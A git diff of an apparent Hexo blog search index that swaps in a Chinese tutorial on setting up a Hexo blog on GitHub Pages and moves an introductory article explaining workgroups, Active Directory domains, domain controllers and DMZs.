-<li>软件集中管理，统一推送软件，统一安装网络打印机等。利用软件发布策略分发软件，可以让用户自由选择安装软件。</li>
-<li>环境集中管理，利用AD可以统一客户端桌面，IE，TCP/IP等设置。</li>
-<li>增强安全性，统一部署杀毒软件和扫毒任务，集中化管理用户的计算机权限、统一制订用户密码策略等，可监控网络，资料统一管理。</li>
-<li>更可靠，更少的宕机时间。如：利用AD控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设定，更可靠，岩机时间更少。</li>
-<li>活动目录为Microsoft统一管理的基础平台，其它isa，exchange，sms等服务都依赖于这个基础平台。</li>
-</ol>
-<h2 id="0x04-AD和DC的区别"><a href="#0x04-AD和DC的区别" class="headerlink" title="0x04 AD和DC的区别"></a>0x04 AD和DC的区别</h2><ul>
-<li>如果网络规模较大，我们就会考虑把网络中的众多对象：计算机、用户、用户组、打印机、共享文件等，分门别类、井然有序地放在一个大仓库中，并做好检索信息，以利于查找、管理和使用这些对象（资源）。这个有层次结构的数据库，就是活动目录数据库，简称AD库。</li>
-<li>那么我们应该把这个数据库放在哪台计算机上呢？规定是这样的，我们把存放有活动目录数据库的计算机就称为DC。所以说我们要实现域环境，其实就是要安装AD，当内网中的一台计算机安装了AD后，它就变成了DC。</li>
-<li>DC的本质是一台计算机，AD的本质是提供目录服务的组件</li>
-</ul>
-<h2 id="0x05-域相关概念"><a href="#0x05-域相关概念" class="headerlink" title="0x05 域相关概念"></a>0x05 域相关概念</h2><h3 id="安全域划分"><a href="#安全域划分" class="headerlink" title="安全域划分"></a>安全域划分</h3><p>安全域划分的目的是将一组安全等级相同的计算机划入同一个网段内，这一网段内的计算机拥有相同的网络边界，在网络边界上采用防火墙部署来实现对其他安全域的NACL（网络访问控制策略），允许哪些IP访问此域、不允许哪些访问此域；允许此域访问哪些IP/网段、不允许访问哪些IP/网段。使得其风险最小化，当发生攻击时可以将威胁最大化的隔离，减少对域内计算机的影响。</p>
-<p><img src="/posts/44578/3.png" alt></p>
-<h3 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h3><ul>
-<li>两个防火墙之间的空间被称为DMZ。</li>
-<li>DMZ是英文“demilitarized zone”的缩写，中文名称为“隔离区”，也称“非军事化区”。</li>
-<li>为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。</li>
-<li>该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。</li>
-<li>另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</li>
-</ul>
-<h2 id="0x06-域中计算机分类"><a href="#0x06-域中计算机分类" class="headerlink" title="0x06 域中计算机分类"></a>0x06 域中计算机分类</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域控制器</span><br><span class="line">成员服务器</span><br><span class="line">客户机</span><br><span class="line">独立服务器</span><br></pre></td></tr></table></figure>
+    <title>使用 hexo 搭建个人博客</title>
+    <url>/posts/28047.html</url>
+    <content><![CDATA[<p>一直想搭建一个个人博客，用来记录平时的学习心得。我也用过很多博客，想CSDN、博客园、简书等，但最终还是选择了<code>hexo</code>，这是完全属于我自己的一方净土。</p>
+<h2 id="什么是-hexo-？"><a href="#什么是-hexo-？" class="headerlink" title="什么是 hexo ？"></a>什么是 hexo ？</h2><p><a href="https://hexo.io/" target="_blank" rel="noopener">hexo</a>是个静态博客框架。使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写好文章，Hexo 会转成静态网页部署到 <a href="https://pages.github.com/" target="_blank" rel="noopener">Github Pages</a>。</p>
+<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><h3 id="安装-Node-js-和-Git"><a href="#安装-Node-js-和-Git" class="headerlink" title="安装 Node.js 和 Git"></a>安装 Node.js 和 Git</h3><p>在安装 Hexo 之前，首先要安装 <a href="https://nodejs.org/en/" target="_blank" rel="noopener">Node.js</a> 和 <a href="https://git-scm.com/" target="_blank" rel="noopener">Git</a>， Node.js 和 Git 的安装比较简单，请自行查看官方文档，这里不再赘述。</p>
+<p>安装好 Node.js 和 Git 后，用 <a href="https://npmjs.org/" target="_blank" rel="noopener">npm</a> 安装 Hexo ， npm 是 Node.js 的 package manager，会随 Node.js 一同安装。由于墙的关系，建议 npm 换成国内的源，比如<a href="http://npm.taobao.org/" target="_blank" rel="noopener">淘宝 NPM 镜像</a>。推荐安装 <a href="https://github.com/Pana/nrm" target="_blank" rel="noopener">nrm</a> (NPM registry manager)，可以在不同的 registry 之间快速切换：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install -g nrm <span class="comment"># 安装 nrm</span></span><br><span class="line">$ nrm ls <span class="comment"># registry 列表</span></span><br><span class="line">$ nrm use taobao  <span class="comment"># 将 registry 切换为 taobao</span></span><br></pre></td></tr></table></figure>
 
-<ul>
-<li>域控制器是存放活动目录数据库的，是域中必须要有的，而其他三种则不是必须的，也就是说最简单的域可以只包含一台计算机，这台计算机就是该域的域控制器。</li>
-<li>域中各个服务器的角色也是可以改变的，例如域服务器在删除活动目录时，如果是域中最后一个域控制器，则该域服务器会成为独立服务器，如果不是域中唯一的域控制器，则将使该服务器成为成员服务器。同时独立服务器既可以转换为域控制器，也可以加入到某个域成为成员服务器。</li>
-</ul>
-<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>今天就先写到这，回头再查点资料，再补充补充。。。</p>
+<h3 id="安装-hexo"><a href="#安装-hexo" class="headerlink" title="安装 hexo"></a>安装 hexo</h3><p>接着使用 npm 安装 hexo：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
+
+<h2 id="创建-Hexo-项目"><a href="#创建-Hexo-项目" class="headerlink" title="创建 Hexo 项目"></a>创建 Hexo 项目</h2><p>安装好 Hexo 后，在本地新建个文件夹作为 Hexo 项目文件夹，名称随意，我的叫 <code>lihthub.github.io</code> ，执行下列命令，Hexo 会在指定文件夹 <code>lihthub.github.io</code> 中新建所需要的文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo init lihthub.github.io <span class="comment"># 初始化 Hexo 项目</span></span><br><span class="line">$ <span class="built_in">cd</span> lihthub.github.io</span><br><span class="line">$ npm install</span><br></pre></td></tr></table></figure>
+
+<p>初始化后，会在文件夹 <code>lihthub.github.io</code> 里生成以下目录结构，这就是你的 Workspace：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml <span class="comment"># 配置文件</span></span><br><span class="line">├── package.json <span class="comment"># 项目所需模块项目的配置信息</span></span><br><span class="line">├── scaffolds <span class="comment"># 用命令生成文章等的模板</span></span><br><span class="line">├── <span class="built_in">source</span> <span class="comment"># 源文件夹，这里放置网站内容</span></span><br><span class="line">|   ├── _drafts <span class="comment"># 放置草稿 markdown 文件</span></span><br><span class="line">|   └── _posts <span class="comment"># 放置博文 markdown 文件</span></span><br><span class="line">└── themes <span class="comment"># 主题文件夹，Hexo 通过将网站内容与主题相结合来生成一个静态网站</span></span><br></pre></td></tr></table></figure>
+
+<p>在 <code>_config.yml</code> 配置文件中填写你的网站的 <code>title</code>、<code>description</code>、<code>author</code> 。更多配置请参考 <a href="https://hexo.io/docs/configuration.html" target="_blank" rel="noopener">Hexo Configuration</a>。</p>
+<p>接着执行下列命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>
+
+<p>缩写：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo g</span><br><span class="line">$ hexo d</span><br><span class="line"><span class="comment"># 组合</span></span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>
+
+<p>到这里本地的博客已经有了初步的原型，先访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看下效果，后面继续。</p>
+<p>Hexo 的命令可以通过 <code>hexo help</code> 和 <code>hexo help [command]</code> 查看帮助，更多请参考 <a href="https://hexo.io/docs/commands.html" target="_blank" rel="noopener">Hexo Commands</a>。</p>
+<h2 id="hexo-主题"><a href="#hexo-主题" class="headerlink" title="hexo 主题"></a>hexo 主题</h2><p>hexo 的默认主题不太喜欢，可以在 <a href="https://github.com/hexojs/hexo/wiki/Themes" target="_blank" rel="noopener">Hexo Themes</a> 选一款自己喜欢的主题，我用过很多主题，<code>next</code>、<code>3-hexo</code>、<code>yilia</code>，最终我还是觉得 <a href="https://github.com/probberechts/cactus-dark" target="_blank" rel="noopener">Cactus Dark</a> 更简单、更友好。</p>
+<p>在 Github 下载主题文件，将文件整个目录 <code>cactus-dark</code> 复制到本地项目的 <code>themes</code> 目录下，然后修改配置文件 <code>_config.yml</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 站点根目录配置文件</span><br><span class="line">theme: cactus-dark</span><br></pre></td></tr></table></figure>
+
+<p>主题相关的配置在 <code>themes/cactus-dark/_config.yml</code> 里面，可以设置链接、添加菜单等，根据自己的需要配置。</p>
+<h2 id="hexo-插件"><a href="#hexo-插件" class="headerlink" title="hexo 插件"></a>hexo 插件</h2><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p><a href="https://github.com/CodeFalling/hexo-asset-image" target="_blank" rel="noopener">hexo-asset-image</a> 能帮助你更好地管理博客中所用到的图片，每篇博文都会生成一个单独的资源文件夹，而不是混在一起。安装命令是：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-asset-image --save</span><br></pre></td></tr></table></figure>
+
+<p>并且需要在根 <code>_config.yml</code> 里设置 <code>post_asset_folder: true</code>。</p>
+<p>安装完成后用 Hexo 新建文章时会在文章同目录下 <code>source/_posts</code> 生成一个和文章同名的文件夹，文章相关的所有图片放这个文件夹里就行，例如：</p>
+<p>在文章中插入图片时链接只要写图片名称就可以，比如要插入 <code>logo.jpg</code> ，只要写成 <code>![logo](logo.jpg)</code>。</p>
+<h3 id="RSS"><a href="#RSS" class="headerlink" title="RSS"></a>RSS</h3><p><a href="https://github.com/hexojs/hexo-generator-feed" target="_blank" rel="noopener">hexo-generator-feed</a> 可生成 <code>atom.xml</code> 文件供订阅使用，安装命令是：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure>
+
+<p>在 <code>_config.yml</code> 中配置以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">feed:</span><br><span class="line">  type: atom</span><br><span class="line">  path: atom.xml</span><br><span class="line">  limit: 20</span><br><span class="line">  hub:</span><br><span class="line">  content:</span><br></pre></td></tr></table></figure>
+
+<p>然后将 <code>/atom.xml</code> 链接添加到 <code>themes/cactus-dark/_config.yml</code> 中设置RSS的位置。</p>
+<h3 id="Sitemap"><a href="#Sitemap" class="headerlink" title="Sitemap"></a>Sitemap</h3><p>Sitemap 可方便搜索引擎抓取网页，安装 <a href="https://github.com/hexojs/hexo-generator-sitemap" target="_blank" rel="noopener">hexo-generator-sitemap</a> 即可自动生成 sitemap.xml 文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-sitemap --save</span><br></pre></td></tr></table></figure>
+
+<p>站内搜索</p>
+<p>首先安装 <a href="https://www.npmjs.com/package/hexo-generator-search" target="_blank" rel="noopener">hexo-generate-search</a> 插件，它会生成一个搜索索引文件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-generator-search --save</span><br></pre></td></tr></table></figure>
+
+<p>接下来，创建一个页面来显示搜索引擎：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new page search</span><br></pre></td></tr></table></figure>
+
+<p>并将 <code>search: true</code> 放入 <a href="https://hexo.io/zh-cn/docs/front-matter.html" target="_blank" rel="noopener">Front-matter</a> ，也就是 <code>.md</code> 文件最上方以 <code>---</code> 分隔的区域。</p>
+<p>最后编辑 <code>_config.yml</code> 并在导航菜单上添加一个搜索链接。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nav:</span><br><span class="line">  search: &#x2F;search&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p>更多 Hexo 插件请参考 <a href="https://hexo.io/plugins/" target="_blank" rel="noopener">Hexo Plugins</a></p>
+<h2 id="发布到-GitHub"><a href="#发布到-GitHub" class="headerlink" title="发布到 GitHub"></a>发布到 GitHub</h2><p>至此本地的博客已经搭建起来了，下一步就是要发布到 Github。</p>
+<p>发布到 Github 前首先要配置 Git 用户信息和在 Github 上加入 SSH key ，如果之前在 Github 上提交过项目或者配置过这两项则可以忽略。</p>
+<h3 id="Git-用户信息"><a href="#Git-用户信息" class="headerlink" title="Git 用户信息"></a>Git 用户信息</h3><p>首先要配置的是你个人的用户名称和电子邮件地址。这两条配置很重要，每次 Git 提交时都会引用这两条信息，说明是谁提交了更新，所以会随更新内容一起被永久纳入历史记录：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name mysecroad <span class="comment"># github名</span></span><br><span class="line">$ git config --global user.email l13273816330@163.com</span><br></pre></td></tr></table></figure>
+
+<p>如果用了 <code>--global</code> 选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。如果要在某个特定的项目中使用其他名字或者电邮，只要去掉 <code>--global</code> 选项重新配置即可，新的设定保存在当前项目的 <code>.git/config</code> 文件里。</p>
+<h3 id="在-Github-添加-SSH-key"><a href="#在-Github-添加-SSH-key" class="headerlink" title="在 Github 添加 SSH key"></a>在 Github 添加 SSH key</h3><p>使用 SSH key 可以连接到 GitHub ，而无需在每次访问时提供用户名或密码，方便 Git 提交代码到 Github 。所以必须提供 SSH key 用于授权。生成 SSH key 的命令是（Linux/Mac 在终端输入，Windows 在 Git Bash 输入）：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh-keygen -t rsa <span class="comment"># 指定 rsa 算法生成密钥</span></span><br></pre></td></tr></table></figure>
+
+<p>接着连续三个回车键（不需要输入密码），然后就会生成两个文件 <code>id_rsa</code> 和 <code>id_rsa.pub</code> ，id_rsa 是密钥，id_rsa.pub 是公钥。这两个文件在 Linux/Mac 系统是在 <code>~/.ssh</code> 下，Windows 系统在 <code>C:/Users/username/.ssh</code> 下。</p>
+<p>接下来要把 id_rsa.pub 的内容添加到 GitHub 上，这样你本地的 id_rsa 密钥跟 Github 上的 id_rsa.pub 公钥进行配对，授权成功才可以提交代码。</p>
+<p>打开 Github 的 Setting 页面，点击左侧的 SSH and GPG keys：</p>
+<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cssh_key.png" alt></p>
+<p>然后点击页面右上角的 New SSH key 按钮：</p>
+<p><img src="/posts/28047/new_ssh.png" alt></p>
+<p>在 Key 那栏把 <code>id_rsa.pub</code> 文件里的内容复制粘贴进去就可以了，<code>Title</code> 不需要填写，点击 Add SSH key 按钮就 ok 了。</p>
+<p>SSH key 添加成功后，输入 <code>ssh -T git@github.com</code> 进行测试，如果出现以下提示就证明添加成功了。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br><span class="line">Hi mysecroad! You<span class="string">'ve successfully authenticated, but GitHub does not provide shell access.</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Github-Pages"><a href="#Github-Pages" class="headerlink" title="Github Pages"></a>Github Pages</h3><p>在 Github 上<a href="https://github.com/new" target="_blank" rel="noopener">新建</a>一个名为 <code>username</code>.github.io 的 repository ， username 是你的 Github 账号，比如我的叫 mysecroad.github.io 。然后修改配置文件 <code>_config.yml</code> 里的以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># url 就是刚才新建的 repository 的名称</span><br><span class="line"># repo 是刚才新建的 repository 的 SSH url</span><br><span class="line">url: https:&#x2F;&#x2F;mysecroad.github.io</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:mysecroad&#x2F;mysecroad.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+
+<p>经过前面的更改主题、安装插件等一系列配置之后，静态文件需要重新生成：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ hexo clean # 清除 public 文件夹中的静态文件</span><br><span class="line">$ hexo generate # 生成静态文件</span><br><span class="line">$ hexo server # 启动本地服务</span><br></pre></td></tr></table></figure>
+
+<p>访问 <a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000/</a> 查看效果，确认页面无误后执行下列命令将静态文件发布到 Github:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy ==&gt; hexo d</span><br></pre></td></tr></table></figure>
+
+<p>到这里博客就完全搭建起来了，访问 <a href="https://mysecroad.github.io/">https://mysecroad.github.io</a> 就可以看到博客了。</p>
+<h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><p>正式发表博客前可以先打个草稿：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new draft <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hello-world 的草稿</span></span><br></pre></td></tr></table></figure>
+
+<p>执行此命令后，会在 <code>source/_drafts</code> 目录下生成一个 <code>hello-world.md</code> 文件，然后用文本编辑器打开 <code>hello-world.md</code> 就可以编辑博文了，使用 <a href="https://daringfireball.net/projects/markdown" target="_blank" rel="noopener">Markdown</a> 撰写。</p>
+<p>新建草稿时标题建议使用英文单词之间加横杠的这种形式，例如 “hello-world” ，而不要使用中文，因为默认会使用文件名作为文章的 url，真正的标题可以在 <code>hello-world.md</code> 文件里面设置。</p>
+<p>默认情况下，草稿不显示。可以在运行 Hexo 时添加 <code>--draft</code> 选项：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server --draft <span class="comment"># 启动服务并预览草稿</span></span><br><span class="line">$ hexo publish <span class="string">"hello-world"</span> <span class="comment"># 发布草稿，会把草稿移到 source/_posts 目录下</span></span><br><span class="line">$ hexo deploy --generate <span class="comment"># 生成静态文件并发布到 Github</span></span><br></pre></td></tr></table></figure>
+
+<p>也可以不打草稿：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new post <span class="string">"hello-world"</span> <span class="comment"># 新建标题为 hellow-world 的博文</span></span><br></pre></td></tr></table></figure>
+
+<p>这个命令会在 <code>source/_posts</code> 目录下生成一个 <code>hello-world.md</code> 文件，同样使用文本编辑器编辑这个文件。博文写完预览后直接发布到 Github：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean</span><br><span class="line">$ hexo d -g</span><br></pre></td></tr></table></figure>
+
+<p>更多请参考 <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Hexo Writing</a>。</p>
+<h2 id="源文件管理"><a href="#源文件管理" class="headerlink" title="源文件管理"></a>源文件管理</h2><p>如果要用另一台电脑写博客怎么办呢，这里介绍一种方法就是使用 Git 分支，创建两个分支，一个分支用来放博客的原始文件，另一个分支用来放生成的静态文件。</p>
+<h3 id="提交源文件到分支"><a href="#提交源文件到分支" class="headerlink" title="提交源文件到分支"></a>提交源文件到分支</h3><p>先删除 <code>themes</code> 文件夹下的 <code>.git</code> 文件。然后在 <code>_config.yml</code> 中的 <code>deploy</code> 参数下设置 <code>branch: master</code> ，如果前面已经设置过就不用改了，这一步是为了确认将静态文件提交到 <code>master</code> 分支：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:lihthub&#x2F;lihthub.github.io.git</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>
+
+<p>接着在本地博客文件夹下依次执行下列命令：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git init <span class="comment"># 初始化 Git 项目</span></span><br><span class="line">$ git checkout -b develop <span class="comment"># 新建并切换到 develop 分支</span></span><br><span class="line"><span class="comment"># 添加远程仓库 origin ，后面是你在 Github 上创建的 repository 的 url</span></span><br><span class="line">$ git remote add origin git@github.com:lihthub/lihthub.github.io.git</span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有文件加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是本地博客文件夹根目录下的 <code>.gitignore</code> 是 Hexo 自带的文件，也要提交到仓库，里面列的是要被 Git 忽略的文件，这些文件不需要纳入 Git 的管理。</p>
+<p>这样就把本地博客项目提交到你的 Github 中 <code>mysecroad.github.io</code> 仓库的 <code>develop</code> 分支上了。然后将仓库的默认分支设置为 <code>develop</code>，因为 <code>develop</code> 分支需要手动管理。</p>
+<p>在 Github 中打开 <code>mysecorad.github.io</code> 仓库的主页面，点击上面的 2 branches:</p>
+<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cgithub.io.png" alt></p>
+<p>然后点击页面右上角的 Change default branch 按钮:</p>
+<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cchange_brance.png" alt></p>
+<p>然后按下图所示依次点击将 Default branch 设为 <code>develop</code>:</p>
+<p><img src="/posts/28047/F:%5Cmyblog%5Csource_posts%5C%E4%BD%BF%E7%94%A8-hexo-%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%5Cdefult.png" alt></p>
+<p>每次更新完博客或者更改了源文件都要执行下列命令提交更新：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git status <span class="comment"># 检查文件状态</span></span><br><span class="line">$ git add . <span class="comment"># 将当前目录的所有更新加入暂存区</span></span><br><span class="line">$ git commit -m <span class="string">"提交说明"</span> <span class="comment"># 提交更新</span></span><br><span class="line">$ git push origin develop <span class="comment"># 推送到远程仓库 origin 的 develop 分支</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="换台电脑写博客"><a href="#换台电脑写博客" class="headerlink" title="换台电脑写博客"></a>换台电脑写博客</h3><p>首先需要在新电脑上将远程仓库克隆下来：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> git@github.com:mysecroad/mysecroad.github.io.git</span><br></pre></td></tr></table></figure>
+
+<p>输入 <code>git branch</code> 确认一下当前分支是否为 develop 。然后安装 Node.js 和 Git 。接着执行以下命令安装 Hexo：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo-cli -g</span><br></pre></td></tr></table></figure>
+
+<p>装好 Hexo 后，进入 <code>mysecroad.github.io</code> 目录，安装所需要的 Hexo 插件：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> mysecroad.github.io</span><br><span class="line">$ npm install</span><br><span class="line">$ npm install hexo-asset-image --save <span class="comment"># 图片管理</span></span><br><span class="line">$ npm install hexo-generator-feed --save <span class="comment"># RSS订阅</span></span><br><span class="line">$ npm install hexo-generator-sitemap --save <span class="comment"># 生成 sitemap.xml</span></span><br><span class="line">$ npm install hexo-deployer-git --save <span class="comment"># Git部署</span></span><br><span class="line">$ npm install hexo-generator-search --save <span class="comment"># 站内搜索</span></span><br></pre></td></tr></table></figure>
+
+<p>按前面的步骤配置好 Git 用户信息和在 Github 上加入 SSH key 后新电脑的环境就搭建好了，就可以写博客了。</p>
 ]]></content>
       <categories>
-        <category>内网渗透</category>
+        <category>hexo</category>
       </categories>
       <tags>
-        <tag>内网渗透</tag>
-        <tag>域</tag>
+        <tag>hexo</tag>
       </tags>
   </entry>
   <entry>
@@ -4245,6 +4141,110 @@ string substr(string, start, length)
 ]]></content>
       <tags>
         <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>内网渗透基础总结</title>
+    <url>/posts/44578.html</url>
+    <content><![CDATA[<h2 id="0x00-内网"><a href="#0x00-内网" class="headerlink" title="0x00 内网"></a>0x00 内网</h2><p>局域网（Local Area Network，LAN）是指在某一区域内由多台计算机互联成的计算机组。一般是方圆几千米以内。局域网可以实现文件管理、应用软件共享、打印机共享、工作组内的日程安排、电子邮件和传真通信服务等功能。局域网是封闭型的，可以由办公室内的两台计算机组成，也可以由一个公司内的上千台计算机组成。</p>
+<h2 id="0x01-工作组、家庭组、域"><a href="#0x01-工作组、家庭组、域" class="headerlink" title="0x01 工作组、家庭组、域"></a>0x01 工作组、家庭组、域</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><ul>
+<li>所有的计算机都是对等的，没有计算机可以控制另一台计算机。每台计算机都具有一组用户帐户。若要登录到工作组中的任何计算机，您必须具有该计算机上的帐户。</li>
+<li>通常情况下，计算机的数量不超过二十台。</li>
+<li>工作组不受密码保护。</li>
+<li>所有的计算机必须在同一本地网络或子网中。</li>
+</ul>
+<h3 id="家庭组"><a href="#家庭组" class="headerlink" title="家庭组"></a>家庭组</h3><ul>
+<li>家庭网络中的计算机必须属于某个工作组，但它们也可以属于某个家庭组。使用家庭组，可轻松与家庭网络中的其他人共享图片、音乐、视频、文档和打印机。</li>
+<li>家庭组受密码保护，但在将计算机添加到家庭组时，只需要键入一次密码即可。</li>
+</ul>
+<h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>域（Domain）是相对工作组（Workgroup）的概念，形象的说，域就像中央集权，由一台或数台域控制器（Domain Controller）管理域内的其他计算机；工作组就像各自为政，组内每一台计算机自己管理自己，他人无法干涉。</p>
+<p>域是一个计算机群体的组合，是一个相对严格的组织，而域控制器则是这个域内的管理核心。</p>
+<p>域控制器（ Domain Controller ，简写为 DC ）可以对域内计算机进行集中管理，比如在域控制器上可以定义所有用户不能更改桌面，或者所有用户的密码长度必须8位以上，而工作组环境的计算机则无法做到这些。</p>
+<p>一般情况下，域控制器集成了DNS服务，可以解析域内的计算机名称（基于TCP/IP），解决了工作组环境不同网段计算机不能使用计算机名互访的问题。</p>
+<ul>
+<li>域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后， 2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。 　　 </li>
+<li>域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域;每个域都有自己的安全策略，以及它与其他域的安全信任关系。 </li>
+<li>域是一种管理边界，用于一组计算机共享共用的安全数据库，域实际上就是一组服务器和工作站的集合。</li>
+</ul>
+<h2 id="0x02-域的分类"><a href="#0x02-域的分类" class="headerlink" title="0x02 域的分类"></a>0x02 域的分类</h2><ul>
+<li>单域</li>
+<li>父域、子域</li>
+<li>域树</li>
+<li>域森林</li>
+<li>DNS域名服务器</li>
+</ul>
+<h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>在一般的具有固定地理位置的小公司里，建立一个域就可以满足所需。</p>
+<p>一般在一个域内要建立至少两个域服务器，一个作为DC，一个是备份DC。如果没有第二个备份DC，那么一旦DC瘫痪了，则域内的其他用户就不能登陆该域了，因为活动目录的数据库（包括用户的帐号信息）是存储在DC中的。而有一台备份域控制器（BDC），则至少该域还能正常使用，期间把瘫痪的DC恢复了就行了。</p>
+<h3 id="父域、子域"><a href="#父域、子域" class="headerlink" title="父域、子域"></a>父域、子域</h3><p>出于管理及其他一些需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域。</p>
+<p>比如一个大公司，它的不同分公司在不同的地理位置，则需父域及子域这样的结构。</p>
+<p>如果把不同地理位置的分公司放在同一个域内，那么他们之间信息交互（包括同步，复制等）所花费的时间会比较长，而且占用的带宽也比较大。（因为在同一个域内，信息交互的条目是很多的，而且不压缩；而在域和域之间，信息交互的条目相对较少，而且压缩。）</p>
+<p>还有一个好处，就是子公司可以通过自己的域来管理自己的资源。</p>
+<p>还有一种情况，就是出于安全策略的考虑，因为每个域都有自己独有的安全策略。比如一个公司的财务部门希望能使用特定的安全策略（包括帐号密码策略等），那么可以将财务部门做成一个子域来单独管理。</p>
+<h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><ul>
+<li><p>域树指若干个域通过建立信任关系组成的集合。一个域管理员只能管理本域的内部，不能访问或者管理其他的域，二个域之间相互访问则需要建立信任关系（Trust Relation）。比如asia.abc.com与Europe.abc.com访问需要建立信任关系</p>
+</li>
